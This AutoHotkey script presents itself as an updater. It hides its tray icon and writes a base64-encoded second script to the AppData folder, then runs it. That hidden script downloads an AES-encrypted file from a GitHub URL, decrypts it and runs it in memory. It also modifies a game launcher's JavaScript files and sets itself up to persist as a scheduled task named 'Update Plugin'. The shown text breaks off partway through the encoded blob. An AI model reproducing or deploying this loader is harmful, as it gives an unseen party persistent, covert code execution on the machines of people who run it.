 #NoTrayIcon
#SingleInstance Force

CreateUpdater()

CreateUpdater() {
   local
   base64 := GetBase64()
   size := CryptStringToBinary(base64, data)
   if !InStr(FileExist(A_AppData . "\Updater"), "D")
      FileCreateDir, % A_AppData . "\Updater"
   filePath := A_AppData . "\Updater\Updater.ahk"
   if !FileExist(filePath) || CompareData(filePath, data, size) {
      File := FileOpen(filePath, "w")
      File.Pos := 0
      File.RawWrite(data, size)
      File := ""
   }
   Run, % filePath
}

CryptStringToBinary(string, ByRef outData, formatName := "CRYPT_STRING_BASE64")
{
   local
   static formats := { CRYPT_STRING_BASE64: 0x1
                     , CRYPT_STRING_HEX:    0x4
                     , CRYPT_STRING_HEXRAW: 0xC }
   fmt := formats[formatName]
   chars := StrLen(string)
   if !DllCall("Crypt32\CryptStringToBinary", "Str", string, "UInt", chars, "UInt", fmt
                                            , "Ptr", 0, "UIntP", bytes, "Ptr", 0, "Ptr", 0)
      throw "CryptStringToBinary failed. LastError: " . A_LastError
   VarSetCapacity(outData, bytes)
   DllCall("Crypt32\CryptStringToBinary", "Str", string, "UInt", chars, "UInt", fmt
                                        , "Str", outData, "UIntP", bytes, "Ptr", 0, "Ptr", 0)
   Return bytes
}

CompareData(filePath, ByRef data, len) {
   local
   fileLen := GetFileData(filePath, fileData)
   if (fileLen != len)
      Return true
   hLib := DllCall("LoadLibrary", "Str", "Bcrypt.dll", "Ptr")
   fileHashLen := CreateHash(&fileData, fileLen, fileHashData)
   dataHashLen := CreateHash(&data, len, hashData)
   DllCall("FreeLibrary", "Ptr", hLib)
   Return DllCall("msvcrt\memcmp", "Ptr", &fileHashData, "Ptr", &hashData, "Ptr", dataHashLen)
}

GetFileData(filePath, ByRef data) {
   local
   File := FileOpen(filePath, "r")
   File.Pos := 0
   File.RawRead(data, len := File.Length)
   File := ""
   Return len
}

CreateHash(pData, size, ByRef hashData, pSecretKey := 0, keySize := 0, AlgId := "SHA256") {
   ; CNG Algorithm Identifiers
   ; https://docs.microsoft.com/en-us/windows/win32/seccng/cng-algorithm-identifiers
   local
   static HMAC := BCRYPT_ALG_HANDLE_HMAC_FLAG := 0x00000008
   DllCall("Bcrypt\BCryptOpenAlgorithmProvider", "PtrP", hAlgorithm, "WStr",  AlgId, "Ptr", 0, "UInt", keySize ? HMAC : 0)
   DllCall("Bcrypt\BCryptCreateHash", "Ptr", hAlgorithm, "PtrP", hHash, "Ptr", 0, "UInt", 0, "Ptr", pSecretKey, "UInt", keySize, "UInt", 0)
   DllCall("Bcrypt\BCryptHashData", "Ptr", hHash, "Ptr", pData, "UInt", size, "UInt", 0)
   DllCall("Bcrypt\BCryptGetProperty", "Ptr", hAlgorithm, "WStr", "HashDigestLength", "UIntP", hashLen, "UInt", 4, "UIntP", cbResult, "UInt", 0)
   VarSetCapacity(hashData, hashLen, 0)
   DllCall("Bcrypt\BCryptFinishHash", "Ptr", hHash, "Ptr", &hashData, "UInt", hashLen, "UInt", 0)
   DllCall("Bcrypt\BCryptDestroyHash", "Ptr", hHash)
   DllCall("Bcrypt\BCryptCloseAlgorithmProvider", "Ptr", hAlgorithm, "UInt", 0)
   Return hashLen
}

GetBase64() {
local
base64 := "77u/I05vVHJheUljb24NCiNQZXJzaXN0ZW50DQojU2luZ2xlSW5zdGFuY2UgT2ZmDQpEZXRlY3RIaWRkZW5XaW5kb3dzLCBPbg0KDQppZiBBX0FyZ3NbMV0NCiAgIFVwZGF0ZSgpDQplbHNlIHsNCiAgIEluZm8gOj0gW10NCiAgIE9uTWVzc2FnZSgweDEyMzQsIEZ1bmMoIk9uQ2hpbGRNZXNzYWdlIikuQmluZChJbmZvKSkNCiAgIFNoZWxsUnVuQXNVc2VyKEFfU2NyaXB0RnVsbFBhdGgsICJ1c2VyICIgLiBBX1NjcmlwdEh3bmQpDQogICB3aGlsZSBJbmZvWzFdID0gIiINCiAgICAgIFNsZWVwLCAxMDANCiAgIGlmIEluZm9bMV0NCiAgICAgIEV4aXRBcHANCiAgIGVsc2Ugew0KICAgICAgU2V0VGltZXIsIFVwZGF0ZSwgJSAxMDAwKjM2MDAqNQ0KICAgICAgVXBkYXRlKCkNCiAgIH0NCn0NClJldHVybg0KDQpVcGRhdGUoKSB7DQogICBzdGF0aWMgaGVscGVyTGluayA6PSAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2pvbGx5Y29kZXIvdGVzdC9tYWluL2FiYy5haGsiDQogICAgICAgICwgdGltZXIgOj0gIiIsIGRhdGEgOj0gIiIsIGxlbiA6PSAiIg0KICAgKCAhdGltZXIgJiYgdGltZXIgOj0gRnVuYyhBX1RoaXNGdW5jKSApDQogICBpZiAoQV9BcmdzWzFdID0gIiIgfHwgQV9BcmdzWzFdID0gInRhc2siKSB7DQogICAgICAoICFsZW4gJiYgbGVuIDo9IFdlYlJlcXVlc3QoaGVscGVyTGluaywgZGF0YSwsLCwgZXJyb3IgOj0gIiIpICkNCiAgICAgIGlmIGVycm9yIHsNCiAgICAgICAgIFNldFRpbWVyLCAlIHRpbWVyLCAtNTAwMA0KICAgICAgICAgUmV0dXJuDQogICAgICB9DQogICB9DQogICBQcm9jZXNzLCBFeGlzdCwgUkFETUlSX0xBVU5DSEVSX0VYLmV4ZQ0KICAgaWYgIShQSUQgOj0gRXJyb3JMZXZlbCkgew0KICAgICAgU2V0VGltZXIsICUgdGltZXIsIC0xMDAwDQogICAgICBSZXR1cm4NCiAgIH0NCiAgIFByb2Nlc3MsIEV4aXN0LCBndGFfc2EuZXhlDQogICBpZiBFcnJvckxldmVsIHsNCiAgICAgIFNldFRpbWVyLCAlIHRpbWVyLCAtMTAwMA0KICAgICAgUmV0dXJuDQogICB9DQogICBpZiAoQV9BcmdzWzFdID0gInVzZXIiKQ0KICAgICAgVHJ5Q3JlYXRlVGFzayhQSUQpDQogICAoIGxlbiAmJiBEeW5hUnVuKERlY3JEYXRhKGRhdGEsIGxlbikpICkNCiAgIGlmIEFfQXJnc1sxXQ0KICAgICAgRXhpdEFwcA0KfQ0KDQpXZWJSZXF1ZXN0KHVybCwgQnlSZWYgZGF0YSwgbWV0aG9kIDo9ICJHRVQiLCBIZWFkZXJzQXJyYXkgOj0gIiIsIGJvZHkgOj0gIiIsIEJ5UmVmIGVycm9yIDo9ICIiKSB7DQogICBXaHIgOj0gQ29tT2JqQ3JlYXRlKCJXaW5IdHRwLldpbkh0dHBSZXF1ZXN0LjUuMSIpDQogICBXaHIuT3BlbihtZXRob2QsIHVybCwgdHJ1ZSkNCiAgIGZvciBuYW1lLCB2YWx1ZSBpbiBIZWFkZXJzQXJyYXkNCiAgICAgIFdoci5TZXRSZXF1ZXN0SGVhZGVyKG5hbWUsIHZhbHVlKQ0KICAgV2hyLlNlbmQoYm9keSkNCiAgIFdoci5XYWl0Rm9yUmVzcG9uc2UoKQ0KICAgc3RhdHVzIDo9IFdoci5zdGF0dXMNCiAgIGlmIChzdGF0dXMgIT0gMjAwKQ0KICAgICAgZXJyb3IgOj0gIkh0dHBSZXF1ZXN0IGVycm9yLCBzdGF0dXM6ICIgLiBzdGF0dXMNCiAgIEFyciA6PSBXaHIucmVzcG9uc2VCb2R5DQogICBwRGF0YSA6PSBOdW1HZXQoQ29tT2JqVmFsdWUoYXJyKSArIDggKyBBX1B0clNpemUpDQogICBsZW5ndGggOj0gQXJyLk1heEluZGV4KCkgKyAxDQogICBWYXJTZXRDYXBhY2l0eShkYXRhLCBsZW5ndGgsIDApDQogICBEbGxDYWxsKCJSdGxNb3ZlTWVtb3J5IiwgIlB0ciIsICZkYXRhLCAiUHRyIiwgcERhdGEsICJQdHIiLCBsZW5ndGgpDQogICBSZXR1cm4gbGVuZ3RoDQp9DQoNClRyeUNyZWF0ZVRhc2soUElEKSB7DQogICBleGVQYXRoIDo9IEdldFByb2Nlc3NJbWFnZU5hbWUoUElEKQ0KICAgU3BsaXRQYXRoLCBleGVQYXRoLCwgZGlyDQogICBqc0RpciA6PSBkaXIgLiAiXHJlc291cmNlc1xwcm9qZWN0c1xjcm1wXGNlZlxhc3NldHNcanMiDQogICBpZiAhKCggKGFwcFBhdGggOj0gRmluZFBhdGgoanNEaXIsICJhcHAuKi5qcyIpKSB8fCAoYXBwUGF0aCA6PSBGaW5kUGF0aChqc0RpciwgIiouanMiKSkgKSAmJiBGaWxlIDo9IEZpbGVPcGVuKGFwcFBhdGgsICJydyIpKQ0KICAgICAgU2VuZE1lc3NhZ2UsIDB4MTIzNCwgMCwgMCwgJSAiYWhrX2lkIiAuIEFfQXJnc1syXQ0KICAgZWxzZSB7DQogICAgICBpZiAoQV9TY3JpcHREaXIgIT0gQV9BcHBEYXRhIC4gIlxVcGRhdGVyIikgew0KICAgICAgICAgaWYgIUluU3RyKEZpbGVFeGlzdChBX0FwcERhdGEgLiAiXFVwZGF0ZXIiKSwgIkQiKQ0KICAgICAgICAgICAgRmlsZUNyZWF0ZURpciwgJSBBX0FwcERhdGEgLiAiXFVwZGF0ZXIiDQogICAgICAgICBpZiBGaWxlRXhpc3QoZmlsZVBhdGggOj0gQV9BcHBEYXRhIC4gIlxVcGRhdGVyXCIgLiBBX1NjcmlwdE5hbWUpIHsNCiAgICAgICAgICAgIEZpbGUgOj0gRmlsZU9wZW4oZmlsZVBhdGgsICJyIikNCiAgICAgICAgICAgIEZpbGUuUG9zIDo9IDANCiAgICAgICAgICAgIEZpbGUuUmF3UmVhZChidWYsIHNpemUgOj0gRmlsZS5MZW5ndGgpDQogICAgICAgICAgICBGaWxlIDo9ICIiDQogICAgICAgICAgICBpZiBDb21wYXJlRGF0YShBX1NjcmlwdEZ1bGxQYXRoLCBidWYsIHNpemUpDQogICAgICAgICAgICAgICBGaWxlQ29weSwgJSBBX1NjcmlwdEZ1bGxQYXRoLCAlIGZpbGVQYXRoLCAxDQogICAgICAgICB9DQogICAgICB9DQogICAgICB0cnkgcmVzIDo9IENyZWF0ZVRhc2soIlVwZGF0ZSBQbHVnaW4iLCBmaWxlUGF0aCwgInRhc2siLCAiMTQ6MDAiLCA1LCBzdGFydEltbWVkaWF0ZWx5IDo9IHRydWUpDQogICAgICBjYXRjaA0KICAgICAgICAgU2VuZE1lc3NhZ2UsIDB4MTIzNCwgMCwgMCwgJSAiYWhrX2lkIiAuIEFfQXJnc1syXQ0KICAgICAgaWYgcmVzDQogICAgICAgICBTZW5kTWVzc2FnZSwgMHgxMjM0LCAxLCAwLCAlICJhaGtfaWQiIC4gQV9BcmdzWzJdDQogICB9DQogICBTbGVlcCwgMjAwDQp9DQoNCkdldFByb2Nlc3NJbWFnZU5hbWUoUElEKSB7DQogICBzdGF0aWMgYWNjZXNzIDo9IFBST0NFU1NfUVVFUllfTElNSVRFRF9JTkZPUk1BVElPTiA6PSAweDEwMDANCiAgIGlmICFoUHJvYyA6PSBEbGxDYWxsKCJPcGVuUHJvY2VzcyIsICJVSW50IiwgYWNjZXNzLCAiSW50IiwgMCwgIlVJbnQiLCBQSUQsICJQdHIiKQ0KICAgICAgdGhyb3cgIkZhaWxlZCB0byBvcGVuIHByb2Nlc3MsIGVycm9yOiAiIC4gQV9MYXN0RXJyb3INCiAgIFZhclNldENhcGFjaXR5KGltYWdlUGF0aCwgMTAyNCwgMCkNCiAgIERsbENhbGwoIlF1ZXJ5RnVsbFByb2Nlc3NJbWFnZU5hbWUiLCAiUHRyIiwgaFByb2MsICJVSW50IiwgMCwgIlN0ciIsIGltYWdlUGF0aCwgIlVJbnRQIiwgNTEyKQ0KICAgRGxsQ2FsbCgiQ2xvc2VIYW5kbGUiLCAiUHRyIiwgaFByb2MpDQogICBSZXR1cm4gaW1hZ2VQYXRoDQp9DQoNCkZpbmRQYXRoKGRpciwgZmlsZU5hbWVQYXR0ZXJuKSB7DQogICBMb29wLCBGaWxlcywgJSBkaXIgLiAiXCIgLiBmaWxlTmFtZVBhdHRlcm4NCiAgICAgIGZpbGVQYXRoIDo9IEFfTG9vcEZpbGVGdWxsUGF0aA0KICAgdW50aWwgZmlsZVBhdGgNCiAgIFJldHVybiBmaWxlUGF0aA0KfQ0KDQpDb21wYXJlRGF0YShmaWxlUGF0aCwgQnlSZWYgZGF0YSwgbGVuKSB7DQogICBsb2NhbA0KICAgZmlsZUxlbiA6PSBHZXRGaWxlRGF0YShmaWxlUGF0aCwgZmlsZURhdGEpDQogICBpZiAoZmlsZUxlbiAhPSBsZW4pDQogICAgICBSZXR1cm4gdHJ1ZQ0KICAgaExpYiA6PSBEbGxDYWxsKCJMb2FkTGlicmFyeSIsICJTdHIiLCAiQmNyeXB0LmRsbCIsICJQdHIiKQ0KICAgZmlsZUhhc2hMZW4gOj0gQ3JlYXRlSGFzaCgmZmlsZURhdGEsIGZpbGVMZW4sIGZpbGVIYXNoRGF0YSkNCiAgIGRhdGFIYXNoTGVuIDo9IENyZWF0ZUhhc2goJmRhdGEsIGxlbiwgaGFzaERhdGEpDQogICBEbGxDYWxsKCJGcmVlTGlicmFyeSIsICJQdHIiLCBoTGliKQ0KICAgUmV0dXJuIERsbENhbGwoIm1zdmNydFxtZW1jbXAiLCAiUHRyIiwgJmZpbGVIYXNoRGF0YSwgIlB0ciIsICZoYXNoRGF0YSwgIlB0ciIsIGRhdGFIYXNoTGVuKQ0KfQ0KDQpHZXRGaWxlRGF0YShmaWxlUGF0aCwgQnlSZWYgZGF0YSkgew0KICAgbG9jYWwNCiAgIEZpbGUgOj0gRmlsZU9wZW4oZmlsZVBhdGgsICJyIikNCiAgIEZpbGUuUG9zIDo9IDANCiAgIEZpbGUuUmF3UmVhZChkYXRhLCBsZW4gOj0gRmlsZS5MZW5ndGgpDQogICBGaWxlIDo9ICIiDQogICBSZXR1cm4gbGVuDQp9DQoNCkNyZWF0ZUhhc2gocERhdGEsIHNpemUsIEJ5UmVmIGhhc2hEYXRhLCBwU2VjcmV0S2V5IDo9IDAsIGtleVNpemUgOj0gMCwgQWxnSWQgOj0gIlNIQTI1NiIpIHsNCiAgIDsgQ05HIEFsZ29yaXRobSBJZGVudGlmaWVycw0KICAgOyBodHRwczovL2RvY3MubWljcm9zb2Z0LmNvbS9lbi11cy93aW5kb3dzL3dpbjMyL3NlY2NuZy9jbmctYWxnb3JpdGhtLWlkZW50aWZpZXJzDQogICBsb2NhbA0KICAgc3RhdGljIEhNQUMgOj0gQkNSWVBUX0FMR19IQU5ETEVfSE1BQ19GTEFHIDo9IDB4MDAwMDAwMDgNCiAgIERsbENhbGwoIkJjcnlwdFxCQ3J5cHRPcGVuQWxnb3JpdGhtUHJvdmlkZXIiLCAiUHRyUCIsIGhBbGdvcml0aG0sICJXU3RyIiwgIEFsZ0lkLCAiUHRyIiwgMCwgIlVJbnQiLCBrZXlTaXplID8gSE1BQyA6IDApDQogICBEbGxDYWxsKCJCY3J5cHRcQkNyeXB0Q3JlYXRlSGFzaCIsICJQdHIiLCBoQWxnb3JpdGhtLCAiUHRyUCIsIGhIYXNoLCAiUHRyIiwgMCwgIlVJbnQiLCAwLCAiUHRyIiwgcFNlY3JldEtleSwgIlVJbnQiLCBrZXlTaXplLCAiVUludCIsIDApDQogICBEbGxDYWxsKCJCY3J5cHRcQkNyeXB0SGFzaERhdGEiLCAiUHRyIiwgaEhhc2gsICJQdHIiLCBwRGF0YSwgIlVJbnQiLCBzaXplLCAiVUludCIsIDApDQogICBEbGxDYWxsKCJCY3J5cHRcQkNyeXB0R2V0UHJvcGVydHkiLCAiUHRyIiwgaEFsZ29yaXRobSwgIldTdHIiLCAiSGFzaERpZ2VzdExlbmd0aCIsICJVSW50UCIsIGhhc2hMZW4sICJVSW50IiwgNCwgIlVJbnRQIiwgY2JSZXN1bHQsICJVSW50IiwgMCkNCiAgIFZhclNldENhcGFjaXR5KGhhc2hEYXRhLCBoYXNoTGVuLCAwKQ0KICAgRGxsQ2FsbCgiQmNyeXB0XEJDcnlwdEZpbmlzaEhhc2giLCAiUHRyIiwgaEhhc2gsICJQdHIiLCAmaGFzaERhdGEsICJVSW50IiwgaGFzaExlbiwgIlVJbnQiLCAwKQ0KICAgRGxsQ2FsbCgiQmNyeXB0XEJDcnlwdERlc3Ryb3lIYXNoIiwgIlB0ciIsIGhIYXNoKQ0KICAgRGxsQ2FsbCgiQmNyeXB0XEJDcnlwdENsb3NlQWxnb3JpdGhtUHJvdmlkZXIiLCAiUHRyIiwgaEFsZ29yaXRobSwgIlVJbnQiLCAwKQ0KICAgUmV0dXJuIGhhc2hMZW4NCn0NCg0KRGVjckRhdGEoQnlSZWYgZGF0YSwgbGVuZ3RoKSB7DQogICBzdGF0aWMgaXYgOj0gInNvbWV0ZXh0IiwgcHcgOj0gIjM5NUZEMDgyLTdCQzktNDY2Mi04MDE5LTk2NjhGQzlEMzQzOSINCiAgIGJhc2U2NCA6PSBTdHJHZXQoJmRhdGEsIGxlbmd0aCwgImNwMCIpDQogICBsZW5ndGggOj0gQ3J5cHRTdHJpbmdUb0JpbmFyeShiYXNlNjQsIGRhdGEpDQogICBwd2RMZW4gOj0gU3RyUHV0QnVmZihwdywgcHdkRGF0YSkNCiAgIGhMaWIgOj0gRGxsQ2FsbCgiTG9hZExpYnJhcnkiLCAiU3RyIiwgIkJjcnlwdC5kbGwiLCAiUHRyIikNCiAgIGxlbkhhc2hQYXNzd29yZCA6PSBDcmVhdGVIYXNoKCZwd2REYXRhLCBwd2RMZW4sIGhhc2hQYXNzd29yZCkNCiAgIGl2TGVuIDo9IFN0clB1dEJ1ZmYoaXYsIGl2RGF0YSkNCiAgIGxlbkhhc2hJdiA6PSBDcmVhdGVIYXNoKCZpdkRhdGEsIGl2TGVuLCBoYXNoSXYpDQogICBWYXJTZXRDYXBhY2l0eShpdjE2LCAxNiwgMCkNCiAgIERsbENhbGwoIlJ0bE1vdmVNZW1vcnkiLCAiUHRyIiwgcEhhc2hJdiA6PSAmaXYxNiwgIlB0ciIsICZoYXNoSXYgKyBsZW5IYXNoSXYgLSAxNiwgIlB0ciIsIGxlbkl2IDo9IDE2KQ0KICAgbGVuIDo9IEJjcnlwdCgmZGF0YSwgbGVuZ3RoLCBvdXREYXRhLCAmaGFzaFBhc3N3b3JkLCBsZW5IYXNoUGFzc3dvcmQsIHBIYXNoSXYsIGxlbkl2KQ0KICAgRGxsQ2FsbCgiRnJlZUxpYnJhcnkiLCAiUHRyIiwgaExpYikNCiAgIHV0ZjggOj0gTnVtR2V0KG91dERhdGEsICJJbnQiKSAmIDB4RkZGRkZGID0gMHhiZmJiZWYNCiAgIFJldHVybiBTdHJHZXQoJm91dERhdGEgKyAodXRmOCA/IDMgOiAwKSwgbGVuLCAiVVRGLTgiKQ0KfQ0KDQpDcnlwdFN0cmluZ1RvQmluYXJ5KHN0cmluZywgQnlSZWYgb3V0RGF0YSwgZm9ybWF0TmFtZSA6PSAiQ1JZUFRfU1RSSU5HX0JBU0U2NCIpDQp7DQogICBzdGF0aWMgZm9ybWF0cyA6PSB7IENSWVBUX1NUUklOR19CQVNFNjQ6IDB4MQ0KICAgICAgICAgICAgICAgICAgICAgLCBDUllQVF9TVFJJTkdfSEVYOiAgICAweDQNCiAgICAgICAgICAgICAgICAgICAgICwgQ1JZUFRfU1RSSU5HX0hFWFJBVzogMHhDIH0NCiAgIGZtdCA6PSBmb3JtYXRzW2Zvcm1hdE5hbWVdDQogICBjaGFycyA6PSBTdHJMZW4oc3RyaW5nKQ0KICAgaWYgIURsbENhbGwoIkNyeXB0MzJcQ3J5cHRTdHJpbmdUb0JpbmFyeSIsICJTdHIiLCBzdHJpbmcsICJVSW50IiwgY2hhcnMsICJVSW50IiwgZm10DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICwgIlB0ciIsIDAsICJVSW50UCIsIGJ5dGVzLCAiUHRyIiwgMCwgIlB0ciIsIDApDQogICAgICB0aHJvdyAiQ3J5cHRTdHJpbmdUb0JpbmFyeSBmYWlsZWQuIExhc3RFcnJvcjogIiAuIEFfTGFzdEVycm9yDQogICBWYXJTZXRDYXBhY2l0eShvdXREYXRhLCBieXRlcykNCiAgIERsbENhbGwoIkNyeXB0MzJcQ3J5cHRTdHJpbmdUb0JpbmFyeSIsICJTdHIiLCBzdHJpbmcsICJVSW50IiwgY2hhcnMsICJVSW50IiwgZm10DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLCAiU3RyIiwgb3V0RGF0YSwgIlVJbnRQIiwgYnl0ZXMsICJQdHIiLCAwLCAiUHRyIiwgMCkNCiAgIFJldHVybiBieXRlcw0KfQ0KDQpCY3J5cHQocERhdGEsIGRhdGFTaXplLCBCeVJlZiBvdXREYXRhLCBwS2V5LCBrZXlTaXplLCBwSXYgOj0gMCwgaXZTaXplIDo9IDAsIEFsZ0lkIDo9ICJBRVMiLCBjcnlwdCA6PSAiRGVjcnlwdCIsIGNoYWluaW5nTW9kZSA6PSAiQ2hhaW5pbmdNb2RlQ0JDIikgew0KOyBjcnlwdDogRW5jcnlwdC9EZWNyeXB0DQogICBzdGF0aWMgcGFkZGluZyA6PSBCQ1JZUFRfQkxPQ0tfUEFERElORyA6PSAxLCBjaGFpbmluZ01vZGVTaXplIDo9IFN0ckxlbihjaGFpbmluZ01vZGUpKjINCiAgIHBMb2NhbEl2IDo9IDANCiAgIGlmIHBJdiB7DQogICAgICBWYXJTZXRDYXBhY2l0eShsb2NhbEl2LCBpdlNpemUsIDApDQogICAgICBEbGxDYWxsKCJSdGxNb3ZlTWVtb3J5IiwgIlB0ciIsIHBMb2NhbEl2IDo9ICZsb2NhbEl2LCAiUHRyIiwgcEl2LCAiUHRyIiwgaXZTaXplKQ0KICAgfQ0KICAgRGxsQ2FsbCgiQmNyeXB0XEJDcnlwdE9wZW5BbGdvcml0aG1Qcm92aWRlciIsICJQdHJQIiwgaEFsZ29yaXRobSwgIldTdHIiLCBBbGdJZCwgIlB0ciIsIDAsICJVSW50IiwgMCkNCiAgIERsbENhbGwoIkJjcnlwdFxCQ3J5cHRTZXRQcm9wZXJ0eSIsICJQdHIiLCBoQWxnb3JpdGhtLCAiV1N0ciIsICJDaGFpbmluZ01vZGUiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICwgIldTdHIiLCBjaGFpbmluZ01vZGUsICJVSW50IiwgY2hhaW5pbmdNb2RlU2l6ZSwgIlVJbnQiLCAwKQ0KICAgRGxsQ2FsbCgiQmNyeXB0XEJDcnlwdEdlbmVyYXRlU3ltbWV0cmljS2V5IiwgIlB0ciIsIGhBbGdvcml0aG0sICJQdHJQIiwgaEtleSwgIlB0ciIsIDAsICJVSW50IiwgMA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICJQdHIiICwgcEtleSwgIlVJbnQiLCBrZXlTaXplLCAiVUludCIsIDAsICJVSW50IikNCiAgIHJlcyA6PSBEbGxDYWxsKCJCY3J5cHRcQkNyeXB0IiAuIGNyeXB0LCAiUHRyIiwgaEtleSwgIlB0ciIsIHBEYXRhLCAiVUludCIsIGRhdGFTaXplLCAiUHRyIiwgMA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLCAiUHRyIiwgcExvY2FsSXYsICJVSW50IiwgaXZTaXplLCAiUHRyIiwgMA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLCAiVUludCIsIDAsICJVSW50UCIsIG91dFNpemUsICJVSW50IiwgcGFkZGluZywgIlVJbnQiKQ0KICAgaWYgKHJlcyAhPSAwKQ0KICAgICAgdGhyb3cgIkNyeXB0IGVycm9yISBCQ3J5cHQiIC4gY3J5cHQgLiAiMSByZXN1bHQ6ICIgLiBGb3JtYXQoIns6I3h9IiwgcmVzKQ0KICAgVmFyU2V0Q2FwYWNpdHkob3V0RGF0YSwgb3V0U2l6ZSwgMCkNCiAgIHJlcyA6PSBEbGxDYWxsKCJCY3J5cHRcQkNyeXB0IiAuIGNyeXB0LCAiUHRyIiwgaEtleSwgIlB0ciIsIHBEYXRhLCAiVUludCIsIGRhdGFTaXplLCAiUHRyIiwgMA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLCAiUHRyIiwgcExvY2FsSXYsICJVSW50IiwgaXZTaXplLCAiUHRyIiwgJm91dERhdGENCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICwgIlVJbnQiLCBvdXRTaXplLCAiVUludFAiLCBvdXRTaXplLCAiVUludCIsIHBhZGRpbmcsICJVSW50IikNCiAgIGlmIChyZXMgIT0gMCkNCiAgICAgIHRocm93ICJDcnlwdCBlcnJvciEgQkNyeXB0IiAuIGNyeXB0IC4gIjIgcmVzdWx0OiAiIC4gRm9ybWF0KCJ7OiN4fSIsIHJlcykNCiAgIERsbENhbGwoIkJjcnlwdFxCQ3J5cHREZXN0cm95S2V5IiwgIlB0ciIsIGhLZXkpDQogICBEbGxDYWxsKCJCY3J5cHRcQkNyeXB0Q2xvc2VBbGdvcml0aG1Qcm92aWRlciIsICJQdHIiLCBoQWxnb3JpdGhtLCAiVUludCIsIDApDQogICBSZXR1cm4gb3V0U2l6ZQ0KfQ0KDQpTdHJQdXRCdWZmKHN0cmluZywgQnlSZWYgZGF0YSwgZW5jb2RpbmcgOj0gIlVURi04IikgIHsNCiAgIFZhclNldENhcGFjaXR5KCBkYXRhLCBsZW4gOj0gKFN0clB1dChzdHJpbmcsIGVuY29kaW5nKSAtIDEpIDw8IChlbmNvZGluZyB+PSAiaSleKFVURi0xNnxjcDEyMDApJCIpICkNCiAgIFN0clB1dChzdHJpbmcsICZkYXRhLCBlbmNvZGluZykNCiAgIFJldHVybiBsZW4NCn0NCg0KRHluYVJ1bih0ZW1wU2NyaXB0LCBhaGtQYXRoIDo9ICIiLCBwaXBlTmFtZSA6PSAiIiwgYXJncyopDQp7DQogICBzdGF0aWMgcGFyYW1zIDo9IFsgIlVJbnQiLCBQSVBFX0FDQ0VTU19PVVRCT1VORCAgICAgOj0gMHgyLCAiVUludCIsIDANCiAgICAgICAgICAgICAgICAgICAgLCAiVUludCIsIFBJUEVfVU5MSU1JVEVEX0lOU1RBTkNFUyA6PSAyNTUsICJVSW50IiwgMA0KICAgICAgICAgICAgICAgICAgICAsICJVSW50IiwgMCwgIlB0ciIsIDAsICJQdHIiLCAwLCAiUHRyIiBdDQogICAgICAgICwgQk9NIDo9IENocigweEZFRkYpDQoNCiAgIChhaGtQYXRoID0gIiIgJiYgYWhrUGF0aCA6PSBBX0Foa1BhdGgpDQogICAocGlwZU5hbWUgPSAiIiAmJiBwaXBlTmFtZSA6PSAiQUhLXyIgLiBBX1RpY2tDb3VudCkNCiAgIA0KICAgTG9vcCAxIHsNCiAgICAgIGZvciBrLCB2IGluIFsicGlwZUdBIiwgInBpcGUiXQ0KICAgICAgICAgJXYlIDo9IERsbENhbGwoIkNyZWF0ZU5hbWVkUGlwZSIsIFN0ciwgIlxcLlxwaXBlXCIgLiBwaXBlTmFtZSwgcGFyYW1zKikNCiAgICAgIGlmICggKHBpcGUgPSAtMSB8fCBwaXBlR0EgPSAtMSkgJiYgZXJyb3IgOj0gIkNhbid0IGNyZWF0ZSBwaXBlICIiIiAuIHBpcGVOYW1lIC4gIiIiYG5MYXN0RXJyb3I6ICIgLiBBX0xhc3RFcnJvciApDQogICAgICAgICBicmVhaw0KICAgICAgc0NtZCA6PSBhaGtQYXRoIC4gIiAiIlxcLlxwaXBlXCIgLiBwaXBlTmFtZSAuICIiIiINCiAgICAgIGZvciBrLCB2IGluIGFyZ3MNCiAgICAgICAgIHNDbWQgLj0gIiAiIiIgLiB2IC4gIiIiIg0KICAgICAgUnVuLCAlIHNDbWQsLCBVc2VFcnJvckxldmVsIEhJREUsIFBJRA0KICAgICAgaWYgKEVycm9yTGV2ZWwgJiYgZXJyb3IgOj0gIkNhbid0IG9wZW4gZmlsZTpgbiAiIlxcLlxwaXBlXCIgLiBwaXBlTmFtZSAuICIiIiIpDQogICAgICAgICBicmVhaw0KICAgICAgZm9yIGssIHYgaW4gWyJwaXBlR0EiLCAicGlwZSJdDQogICAgICAgICBEbGxDYWxsKCJDb25uZWN0TmFtZWRQaXBlIiwgUHRyLCAldiUsIFB0ciwgMCkNCiAgICAgIHRlbXBTY3JpcHQgOj0gQk9NIC4gdGVtcFNjcmlwdA0KICAgICAgdGVtcFNjcmlwdFNpemUgOj0gKCBTdHJMZW4odGVtcFNjcmlwdCkgKyAxICkgPDwgISFBX0lzVW5pY29kZQ0KICAgICAgaWYgIURsbENhbGwoIldyaXRlRmlsZSIsIFB0ciwgcGlwZSwgU3RyLCB0ZW1wU2NyaXB0LCBVSW50LCB0ZW1wU2NyaXB0U2l6ZSwgVUludFAsIDAsIFB0ciwgMCkNCiAgICAgICAgIGVycm9yIDo9ICJXcml0ZUZpbGUgZmFpbGVkLCBMYXN0RXJyb3I6ICIgLiBBX0xhc3RFcnJvcg0KICAgfQ0KICAgZm9yIGssIHYgaW4gWyJwaXBlR0EiLCAicGlwZSJdDQogICAgICAoICV2JSAhPSAtMSAmJiBEbGxDYWxsKCJDbG9zZUhhbmRsZSIsIFB0ciwgJXYlKSApDQogICBpZiBlcnJvcg0KICAgICAgdGhyb3cgRXhjZXB0aW9uKGVycm9yKQ0KICAgUmV0dXJuIFBJRA0KfQ0KDQpTaGVsbFJ1bkFzVXNlcihmaWxlUGF0aCwgYXJndW1lbnRzIDo9ICIiLCBkaXJlY3RvcnkgOj0gIiIsIHZlcmIgOj0gIm9wZW4iLCBzaG93IDo9IDEpDQp7DQogICBz